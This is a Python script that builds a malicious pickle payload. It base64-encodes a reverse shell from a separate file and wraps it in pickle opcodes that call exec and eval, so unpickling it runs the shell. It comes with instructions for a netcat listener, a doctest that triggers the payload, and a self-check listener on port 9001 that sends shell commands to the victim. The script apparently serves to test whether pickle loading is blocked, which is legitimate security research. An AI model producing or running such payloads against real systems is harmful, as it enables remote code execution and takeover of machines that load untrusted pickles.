"""
Create a picke bomb with reverse shell.

Load the reverse shell code from rshell.py, base64-encode it.


Printing a bomb payload
-----------------------

    python pickle_rshell.py


Selfchecking
------------

    python pickle_rshell.py --selfcheck


Testing
-------

Run first:

    nc -v -l 9001

Then:

    python -m doctest -v pickle_rshell.py


Example
--------

>>> import pickle
>>> print("Loading pickle...")
Loading pickle...
>>> pickle.loads(pickled_bomb)
>>> print("Loaded pickle (NOT BLOCKED)...")
Loaded pickle (NOT BLOCKED)...
>>> import time
>>> time.sleep(10)

See also
--------

Credits goes to https://intoli.com/blog/dangerous-pickles/

"""

import base64

with open('rshell.py', 'rb') as infile:
  b64code = base64.b64encode(infile.read())
# print(b64code)

pickled_bomb = b''.join([
b'''c__builtin__
exec
(Vimport base64
tR''',
b'''c__builtin__
eval
(Vexec(base64.b64decode("''' + b64code + b'''").decode())
tR''',
b'''.'''
])

print(pickled_bomb)


import sys

if __name__ == "__main__" and len(sys.argv) > 1 and sys.argv[1] == '--selfcheck':

  # Testing the rshell with client:

  import asyncio

  async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    print(f"Connected from {addr}")

    commands = ['uname -a', 'w', 'exit']

    async def read_input():
      while len(commands) > 0:
        user_input = commands.pop(0)
        print(f'\033[92m>>> {user_input}\033[0m')
        writer.write(user_input.encode() + b'\n')
        await writer.drain()

      await asyncio.sleep(1)
      global server
      server.close()

    async def read_output():
      while data := await reader.read(1024):
        print(data.decode(), end='')

    await asyncio.gather(read_input(), read_output())

  async def serve():
    global server
    server = await asyncio.start_server(handle_client, '0.0.0.0', 9001)
    async with server:
      try:
        await server.serve_forever()
      except asyncio.exceptions.CancelledError:
        pass


  import pickle
  print("Loading pickle...")
  pickle.loads(pickled_bomb)
  print("Loaded pickle (NOT BLOCKED)...")
  asyncio.run(serve())
